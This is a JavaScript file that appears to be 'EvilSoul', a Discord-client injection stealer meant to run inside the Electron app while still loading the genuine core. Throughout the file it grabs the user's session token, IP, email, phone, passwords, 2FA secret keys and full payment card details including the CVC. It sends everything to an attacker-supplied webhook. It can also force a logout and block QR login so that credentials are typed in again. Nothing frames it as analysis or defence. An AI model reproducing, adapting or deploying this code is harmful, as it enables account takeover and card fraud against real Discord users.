process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0

const fs = require("fs")
const electron = require("electron")
const https = require("https");
const queryString = require("querystring")

var computerName = process.env.COMPUTERNAME
var tokenScript = `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`
var logOutScript = `function getLocalStoragePropertyDescriptor(){const o=document.createElement("iframe");document.head.append(o);const e=Object.getOwnPropertyDescriptor(o.contentWindow,"localStorage");return o.remove(),e}Object.defineProperty(window,"localStorage",getLocalStoragePropertyDescriptor());const localStorage=getLocalStoragePropertyDescriptor().get.call(window);localStorage.token=null,localStorage.tokens=null,localStorage.MultiAccountStore=null,location.reload();console.log(localStorage.token + localStorage.tokens + localStorage.MultiAccountStore);`

const dataNow = new Date().toISOString();
const webhook = '%WEBHOOK%'

let contents2FA = []

var config = {
  "logout": "%LOGOUT%",
  "logout-notify": "true",
  "init-notify": "true",
  "embed-color": 2895667,
  "disable_qrcode": "%DISABLE_QRCODE%",
  Filter: {
        urls: [
            "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
            "https://*.discord.com/api/v*/applications/detectable",
            "https://discord.com/api/v*/applications/detectable",
            "https://*.discord.com/api/v*/users/@me/library",
            "https://discord.com/api/v*/users/@me/library",
            "https://*.discord.com/api/v*/users/@me/billing/subscriptions",
            "https://discord.com/api/v*/users/@me/billing/subscriptions",
            "wss://remote-auth-gateway.discord.gg/*"
        ]
    },
    onCompleted: {
        urls: [
            "https://discord.com/api/v*/users/@me",
            "https://discordapp.com/api/v*/users/@me",
            "https://*.discord.com/api/v*/users/@me",
            "https://discordapp.com/api/v*/auth/login",
            'https://discord.com/api/v*/auth/login',
            'https://*.discord.com/api/v*/auth/login',
            "https://api.stripe.com/v*/tokens",
            "https://discord.com/api/v*/auth/mfa/totp",
            "https://discordapp.com/api/v*/auth/mfa/totp",
            "https://*.discord.com/api/v*/auth/mfa/totp",
            "https://discord.com/api/v*/users/@me/mfa/totp/enable"
        ]
    },
}

async function execScript(str) {
    var window = electron.BrowserWindow.getAllWindows()[0]
    var script = await window.webContents.executeJavaScript(str, true)
    return script || null

}

const getIP = async () => {
    var json = await execScript(`var xmlHttp = new XMLHttpRequest();\nxmlHttp.open( "GET", "https://www.myexternalip.com/json", false );\nxmlHttp.send( null );\nJSON.parse(xmlHttp.responseText);`)
    return json.ip
}

const getURL = async (url, token) => {
    var c = await execScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "${url}", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    JSON.parse(xmlHttp.responseText);`)
    return c
}

const GetBadges = (e) => {
    var n = "";
    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:1041639667226914826> "), 4 == (4 & e) && (n += "<:hypesquadevent:1082679435452481738> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 64 == (64 & e) && (n += "<:bravery:874750808388952075> "), 128 == (128 & e) && (n += "<:brilliance:874750808338608199> "), 256 == (256 & e) && (n += "<:balance:874750808267292683> "), 512 == (512 & e) && (n += "<a:kkkk:1326846144818708523>"), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> "), 131072 == (131072 & e) && (n += "<:devcertif:1041639665498861578> "), "" == n && (n = " "), n
}
const GetRBadges = (e) => {
    var n = "";
    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:1041639667226914826> "), 4 == (4 & e) && (n += "<:hypesquadevent:1082679435452481738> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 512 == (512 & e) && (n += "<:early:944071770506416198> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 131072 == (131072 & e) && (n += "<:devcertif:1041639665498861578> "), "" == n && (n = " "), n
}

const GetNSFW = (bouki) => {
    switch (bouki) {
        case true:
            return ":underage: `NSFW Allowed`"
        case false:
            return ":underage: `NSFW Not Allowed`"
        default:
            return "Idk bro you got me"
    }
}
const GetA2F = (bouki) => {
    switch (bouki) {
        case true:
            return "`Enabled`"
        case false:
            return "`Not Enabled`"
        default:
            return "WTF DONT HAVES MFA OR HAVES?????"
    }
}



const parseFriends = friends => {
    try{
    var real = friends.filter(x => x.type == 1)
    var rareFriends = ""
    for (var friend of real) {
        var badges = GetRBadges(friend.user.public_flags)
        if (badges !== ":x:") rareFriends += `${badges} ${friend.user.username}#${friend.user.discriminator}\n`
    }
    if (!rareFriends) rareFriends = "No Rare Friends"
    return {
        len: real.length,
        badges: rareFriends
    }
}catch(err){
    return ":x:"
}
}

const parseBilling = billings => {
    var Billings = " "
    try{
    if(!billings) return Billings = "No billing";
    billings.forEach(res => {
        if (res.invalid) return
        switch (res.type) {
            case 1:
                Billings += ":credit_card:"
                break
            case 2:
                Billings += "<:paypal:896441236062347374>"
        }
    })
    if (!Billings) Billings = "No billing"
    return Billings
}catch(err){
    return " "
}
}

const calcDate = (a, b) => new Date(a.setMonth(a.getMonth() + b))

const GetNitro = r => {
    switch (r.premium_type) {
        default:
            return " "
        case 1:
            return "<:946246402105819216:962747802797113365>"
        case 2:
            if (!r.premium_guild_since) return "<:946246402105819216:962747802797113365>"
            var now = new Date(Date.now())
            var arr = ["<:Booster1Month:1051453771147911208>", "<:Booster2Month:1051453772360077374>", "<:Booster6Month:1051453773463162890>", "<:Booster9Month:1051453774620803122>", "<:boost12month:1068308256088400004>", "<:Booster15Month:1051453775832961034>", "<:BoosterLevel8:1051453778127237180>", "<:Booster24Month:1051453776889917530>"]
            var a = [new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since)]
            var b = [2, 3, 6, 9, 12, 15, 18, 24]
            var r = []
            for (var p in a) r.push(Math.round((calcDate(a[p], b[p]) - now) / 86400000))
            var i = 0
            for (var p of r) p > 0 ? "" : i++
            return "<:946246402105819216:962747802797113365> " + arr[i]
    }
}

function GetLangue(read) {
    var languages = {
        "fr": ":flag_fr:",
        "da": ":flag_dk:",
        "de": ":flag_de:",
        "en-GB": ":england:",
        "en-US": ":flag_us:",
        "en-ES": ":flag_es:",
        "hr": ":flag_hr:",
        "it": ":flag_it:",
        "lt": ":flag_lt:",
        "hu": ":flag_no::flag_hu:",
        "no": ":flag_no:",
        "pl": ":flag_pl:",
        'pr-BR': ":flag_pt:",
        "ro": ":flag_ro:",
        "fi": ":flag_fi:",
        "sv-SE": ":flag_se:",
        "vi": ":flag_vn:",
        "tr": ":flag_tr:",
        "cs": ":flag_cz:",
        "el": ":flag_gr:",
        "bg": ":flag_bg:",
        "ru": ":flag_ru:",
        "uk": ":flag_ua:",
        "hi": ":flag_in:",
        "th": ":flag_tw:",
        "zh-CN": ":flag_cn:",
        "ja": ":flag_jp:",
        "zh-TW": ":flag_cn:",
        "pt-BR": ":flag_br:",
        "ko": ":flag_kr:"
    }

    var langue = languages[read] || "";
    return langue
}

async function sendWebhook(webhookUrl, webhookData) {

  const jsonData = JSON.stringify(webhookData);

  const urlParts = new URL(webhookUrl);
  const requestOptions = {
    hostname: urlParts.hostname,
    path: urlParts.pathname,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': jsonData.length,
    },
  };

  const request = https.request(requestOptions, (response) => {
    let responseData = '';

    response.on('data', (chunk) => {
      responseData += chunk;
    });

    response.on('end', () => {
      console.log('Webhook response:', responseData);
    });
  });

  request.on('error', (error) => {
    console.error('Error sending webhook:', error);
  });

  request.write(jsonData);

  request.end();
}

const path = (function () {
    var appPath = electron.app.getAppPath().replace(/\\/g, "/").split("/")
    appPath.pop()
    appPath = appPath.join("/")
    var appName = electron.app.getName()
    return {
        appPath,
        appName
    }
}())

async function initOne() {
  var ip = await getIP()
  var token = await execScript(tokenScript)

  var user = await getURL("https://discord.com/api/v8/users/@me", token)

  var avatar = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`

  if (config['init-notify'] !== "true") {
    return true;
  }

  if (!fs.existsSync(__dirname + "/EvilSoul")) {
    fs.mkdirSync(__dirname + "/EvilSoul");
  }else {
    return true;
  }
  var { appPath, appName } = path;
  var client_discord = appName;

  const embed = {
    color: 0x2b2d31,
    fields: [
        {
            name: "Token:",
            value: "```"+token+"```",
            inline: false
        },
      {
        name: "Client:",
        value: "`"+appName+"`",
        inline: true
      },
      {
        name: "Computer Name:",
        value: "`"+computerName+"`",
        inline: true
      },
      {
        name: "IP:",
        value: "`"+ip+"`",
        inline: true
      },
      {
        name: "Injection Path:",
        value: "```"+__dirname+"```",
        inline: false
      }
    ],
    "author": {
      name: `${user.username} (${user.id})`,
      icon_url: avatar,
    },
    footer: {
        icon_url: "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg",
        text: "EvilSoul | t.me/EvilSoulStealer"
      },
    timestamp: dataNow,
  };

  const webhookData = {
    embeds: [embed],
    username: "Injections - EvilSoul",
    avatar_url: "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg"
  };

  sendWebhook(webhook, webhookData);
  await execScript(logOutScript);
}

initOne();

function customData(content) {
  const data333 = {
    content: content
  }

  return data333;
}

electron.session.defaultSession.webRequest.onBeforeRequest(config.Filter, (details, callback) => {
  if (config["disable_qrcode"] == true) {
    if (details.url.startsWith('wss://remote-auth-gateway')) return callback({ cancel: true });
  }
});

electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async (request, callback) => {
  if (!["POST", "PATCH"].includes(request.method)) return
  if (request.statusCode !== 200) return

  try {
      var data = JSON.parse(request.uploadData[0].bytes)
  } catch (err) {
      var data = queryString.parse(decodeURIComponent(request.uploadData[0].bytes.toString()))
  }

  var token = await execScript(tokenScript)
  var ip = getIP()
  var user = await getURL("https://discord.com/api/v8/users/@me", token)
  var billing = await getURL("https://discord.com/api/v9/users/@me/billing/payment-sources", token)
  var friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token)
  var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);

  var Billings = parseBilling(billing)

  if (!user.avatar) var userAvatar = "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg"
  if (!user.banner) var userBanner = ""

  userAvatar = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`

  var { appPath,appName } = path
  var client_discord = appName

  var password_to2fa

  switch(true) {

    case request.url.endsWith("login"):
      var password = data.password
      var email = data.login

      contents2FA.push({passwd: password})

      function sendPassword() {
        sendWebhook(webhook, "Parsa ta aq o: "+password_to2fa)
        return password_to2fa
      }

      if(token == null) {
        return true;
      }

      const embedLogin = {
        color: 0x530000,
        fields: [
            { name: "Token:", value: "```"+token+"```", inline: false },
            { name: "Badges:", value: `${GetNitro(Nitro)} ${GetBadges(user.flags)}`, inline: true },    
            { name: "Billing:", value: Billings, inline: true },
            { name: "2FA Enable:", value: GetA2F(user.mfa_enabled), inline: true },
            { name: "Email:", value: "`"+user.email+"`", inline: true },
            { name: "Password:", value: "`"+password+"`", inline: true },
            { name: "Phone:", value: "`"+user.phone+"`", inline: true },  
        ],
        author: {
          name: `${user.username} (${user.id})`,
          icon_url: userAvatar
        },
        footer: {
          icon_url: "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg",
          text: "EvilSoul | t.me/EvilSoulStealer"
        },
        timestamp: dataNow,
      }

      const dataLogin = {
        embeds: [embedLogin],
        username: "Logins - EvilSoul",
        avatar_url: "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg"
      }

      await sendWebhook(webhook, dataLogin);
      break

    case request.url.endsWith("totp"):

      const passwdddd = contents2FA[0].passwd

      const embedLogin3 = {
        color: 0x530000,
        fields: [
          { name: "Token:", value: "```"+token+"```", inline: false },
          { name: "Badges:", value: `${GetNitro(Nitro)} ${GetBadges(user.flags)}`, inline: true },
          { name: "Billing:", value: Billings, inline: true },
          { name: "2FA Enable:", value: GetA2F(user.mfa_enabled), inline: true },
          { name: "Email:", value: "`"+user.email+"`", inline: true },
          { name: "Password:", value: "`"+passwdddd+"`", inline: true },
          { name: "Phone:", value: "`"+user.phone+"`", inline: true },
        ],
        author: { name: `${user.username} (${user.id})`, icon_url: userAvatar },
        footer: { icon_url: "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg", text: "EvilSoul | t.me/EvilSoulStealer" },
        timestamp: dataNow,
      }

      contents2FA.splice(0, contents2FA.length);

      const dataLogin3 = {
        embeds: [embedLogin3],
        username: "Logins - EvilSoul",
        avatar_url: "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg"
      }

      await sendWebhook(webhook, dataLogin3);

      break

    case request.url.endsWith("tokens"):
      var card_number = data["card[number]"]
      var cvc = data["card[cvc]"]
      var exp_year = data["card[exp_year]"]
      var exp_month = data["card[exp_month]"]

      var full_card = card_number+"|"+exp_month+"|"+exp_year+"|"+cvc

      const embedCard = {
        color: 0x590000,
        fields: [
          { name: "Token:", value: "```" + token + "```", inline: false },
          { name: "Badges:", value: `${GetNitro(Nitro)} ${GetBadges(user.flags)}`, inline: true },
          { name: "Email:", value: "`" + user.email + "`", inline: true },
          { name: "Phone:", value: "`" + user.phone + "`", inline: true },
          { name: "Card Number:", value: "`" + card_number + "`", inline: true },
          { name: "Expiration Date:", value: "`" + exp_month + "/" + exp_year + "`", inline: true },
          { name: "CVC:", value: "`" + cvc + "`", inline: true }
        ],
        author: { name: `${user.username} (${user.id})`, icon_url: userAvatar },
        footer: { icon_url: "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg", text: "EvilSoul | t.me/EvilSoulStealer" },
        timestamp: dataNow
      };      

      const webhookData = {
        embeds: [embedCard],
        username: "Cards - NikkiSt3aler",
        avatar_url: "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg"
      };
      await sendWebhook(webhook, webhookData)
      break
    case request.url.endsWith("@me"):
      var old_passwd = data.password
      var new_passwd = data.new_password
      var new_token = await execScript(tokenScript)

      if(!new_passwd || !old_passwd) {
        return true
      }

      const embedNewPasswd = {
        color: 0x590000,
        fields: [
            { name: "New Token",  value: "```"+new_token+"```", inline: true },
            { name: "Badges:", value: `${GetNitro(Nitro)} ${GetBadges(user.flags)}`, inline: true },
            { name: "Email", value: "`"+user.email+"`", inline: true },
            { name: "Phone", value: "`"+user.phone+"`", inline: true },
            { name: "Old Password", value: "`"+old_passwd+"`", inline: true },
            { name: "New Password", value: "`"+new_passwd+"`", inline: true },
            { name: "2FA Enable:", value: GetA2F(user.mfa_enabled), inline: true },
        ],
        author: { name: `${user.username} (${user.id})`, icon_url: userAvatar },
        footer: {icon_url: "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg", text: "EvilSoul | t.me/EvilSoulStealer", },
        timestamp: dataNow,
      }

      const webhookData2 = {
        embeds: [embedNewPasswd],
        username: "Password Changer - EvilSoul",
        avatar_url: "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg"
      }

      await sendWebhook(webhook, webhookData2)
      break

    case request.url.endsWith("enable"):
      var secret = data.secret
      var password = data.password
      var new_token = await execScript(tokenScript)

      const embedMFAENABLED = {
        color: 0x590000,
        fields: [
            { name: "New Token",  value: "```"+new_token+"```", inline: false },
            { name: "Email", value: "`"+user.email+"`", inline: true },
            { name: "Password", value: "`"+password+"`", inline: true },
            { name: "Secret Key (PUT IN GOOGLE AUTHENTICATOR)", value: "`"+secret+"`", inline: false },
        ],
        author: { name: `${user.username} (${user.id})` , icon_url: userAvatar },
        footer: { icon_url: "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg", text: "EvilSoul | t.me/EvilSoulStealer", },
        timestamp: dataNow,
      }

      const dataToWebhook = {
        embeds: [embedMFAENABLED],
        username: "Alerts - EvilSoul",
        avatar_url: "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg"
      }

      await sendWebhook(webhook, dataToWebhook)
      break
  }
});

module.exports = require("./core.asar")
